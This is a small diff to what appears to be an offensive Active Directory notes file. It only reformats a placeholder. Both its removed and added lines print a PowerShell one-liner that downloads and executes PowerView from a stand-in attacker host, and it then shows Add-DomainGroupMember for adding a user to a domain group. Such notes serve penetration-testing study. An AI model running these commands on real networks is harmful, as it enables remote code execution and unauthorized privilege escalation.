@@ -36,7 +36,7 @@ Additionally can be done with Active directory module (powershell module):
 
 Also is possible with powerview module:
 
-Load module -> `IEX (new-object net.webclient).downloadstring('http://your_evil_ip_or_domain/powerview.ps1')`
+Load module -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`
 
 `Add-DomainGroupMember -Identity '<group>' -Members '<user>'`
 
